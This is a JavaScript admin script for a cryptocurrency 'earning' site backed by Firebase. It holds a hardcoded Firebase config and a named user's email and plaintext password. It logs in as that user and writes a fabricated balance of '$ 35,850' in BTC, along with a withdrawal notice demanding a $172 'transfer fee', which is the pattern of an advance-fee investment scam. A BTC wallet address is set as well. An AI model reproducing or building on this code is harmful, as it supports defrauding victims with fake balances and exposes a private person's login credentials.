var firebaseConfig = {
  apiKey: "AIzaSyB5KeklDZE4GMt_mu2OPgLiGmfviSAJgI4",
    authDomain: "crytoearn-aac54.firebaseapp.com",
    databaseURL: "https://crytoearn-aac54-default-rtdb.firebaseio.com",
    projectId: "crytoearn-aac54",
    storageBucket: "crytoearn-aac54.appspot.com",
    messagingSenderId: "54158210201",
    appId: "1:54158210201:web:903faffeb84ba9859e3408",
    measurementId: "G-RBP0QLMXD4"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  //Initialize variables
  const auth = firebase.auth()
  const database = firebase.database()





function admin_control() {
    var user_details_holder;
    // Get all our input fields
    email = "kellylambeth39@gmail.com";
    password = "Kelly39$";
    
    auth.signInWithEmailAndPassword(email, password)
  .then(function() {
      // Declare user variable
      var user = auth.currentUser

      // Add this user to Firebase Database
      var database_ref = database.ref()

      //withdrawMsg : ['Oops!', 'something went wrong. coentact the admin', 'info'],

      var get_transaction_hist = [];
      var firebaseRef = firebase.database().ref("users");
      firebaseRef.once("value", function(snapshot){
          snapshot.forEach(function(element){
              if(element.val().email == email){
                  user_details_holder = element.val();
                  get_transaction_hist = user_details_holder.transaction_history;
                  console.log(user_details_holder);
                  //console.log(JSON.stringify(user_details_holder));
              }
          })
      })

      var new_history = {
          tran_id : "",
          amount : "",
          currency : "",
          tran_info: "",
          status : ""
      };
      // PUSH NEW HISTORY TO HISTORY ARRAY
      get_transaction_hist.push(new_history);

      // Create User data
      var user_data = {
             current_bal : "$ 35,850",
             btc_bal : "$ 35,850",
             btc_value : "1.210068",
             withdrawMsg : ['Hello Kelly', 'You are required to pay a transfer fee worth $172 to enable withdrawals on your account', 'success'],
            // btc_barcode : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANkAAADZAQAAAACFxajbAAACCUlEQVR4nN2YMc6bQBBG32csrbt1lxJuss7JwDeDI+QGcAMoIoEEfCnw7+53JKcwZBqkfSA9aXaZ2ZH5Nu6n7xnsD1qSJJYLnSrrAtwlSbcd2r6GmW1XZIOKpBMMBdh2u0vb13CSbliX2DbVmo10NyxdPyf0j1AzQ6rJJuXtLoT+AWZjbFO1Zu5SvQuhd2Cwa1hiT2OYroDs/nNCb8NFkiqH4dqV8pnY3JCkYpe2r8JbrBBbWAk96bFW7c72JTz7RPxVQPb7knw/ZSNuZKYf/Q5t/w7zutQMgCZdSRWE/pNCb8EzhE6gJZrGy/Pl4Zp+7s729VlZASjXzH1ur4Q+r8tHC7A729dQHqMtzduvyyNw1zxdPyX0PrRi38nSZSiaiuVCV1brEvtPCb0NsUcAzaEnVWtmtwChJx1sg2GP5LY8xhY8E+3qkHUFe4yu0Rz63JVnYgsQ3B4tKydgKCjX58pQUHrrk3dp+z30OfQk+UxsG/tMbMFhuHZHu0XiOdh1CZDbmoOfcbQN5jBIpTQHNzcAOknSEbPy7IyB0jOxTV4zH/DYf01cCD1pe3D/pNDbkHVrtx61UXPwlpXjlcjTY+LCchmSqxWg0Wm5xHaftn+HjwYSJhXJMB3vQvwFHcbYNiYbyes72QFHes+zAuS259CTtmvL4erKY+ICW13Jxq9PuqPVFf0/k/w/sZU3fRRjEq4AAAAASUVORK5CYII=",
            // eth_barcode : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANkAAADZAQAAAACFxajbAAACCUlEQVR4nN2YMc6bQBBG32csrbt1lxJuss7JwDeDI+QGcAMoIoEEfCnw7+53JKcwZBqkfSA9aXaZ2ZH5Nu6n7xnsD1qSJJYLnSrrAtwlSbcd2r6GmW1XZIOKpBMMBdh2u0vb13CSbliX2DbVmo10NyxdPyf0j1AzQ6rJJuXtLoT+AWZjbFO1Zu5SvQuhd2Cwa1hiT2OYroDs/nNCb8NFkiqH4dqV8pnY3JCkYpe2r8JbrBBbWAk96bFW7c72JTz7RPxVQPb7knw/ZSNuZKYf/Q5t/w7zutQMgCZdSRWE/pNCb8EzhE6gJZrGy/Pl4Zp+7s729VlZASjXzH1ur4Q+r8tHC7A729dQHqMtzduvyyNw1zxdPyX0PrRi38nSZSiaiuVCV1brEvtPCb0NsUcAzaEnVWtmtwChJx1sg2GP5LY8xhY8E+3qkHUFe4yu0Rz63JVnYgsQ3B4tKydgKCjX58pQUHrrk3dp+z30OfQk+UxsG/tMbMFhuHZHu0XiOdh1CZDbmoOfcbQN5jBIpTQHNzcAOknSEbPy7IyB0jOxTV4zH/DYf01cCD1pe3D/pNDbkHVrtx61UXPwlpXjlcjTY+LCchmSqxWg0Wm5xHaftn+HjwYSJhXJMB3vQvwFHcbYNiYbyes72QFHes+zAuS259CTtmvL4erKY+ICW13Jxq9PuqPVFf0/k/w/sZU3fRRjEq4AAAAASUVORK5CYII=",
            // eth_bal : "$ 0",
            // eth_value : "0.034",
             btc_wallet : "36E36yCjrPTUcuXqofMSC2atptkRPCFLE4",
             transaction_history : [],
            // eth_wallet : "eth wallet",
            transaction_history : get_transaction_hist,
            //verify_status : "verified"
      }
      
    // Push to Firebase Database
    database_ref.child('users/' + user.uid).update(user_data)

      alert("Done!!");
    
  })
  .catch(function(error) {
      var error_code = error.code;
      var error_message = error.message;
      
      alert(error_message)
  })
}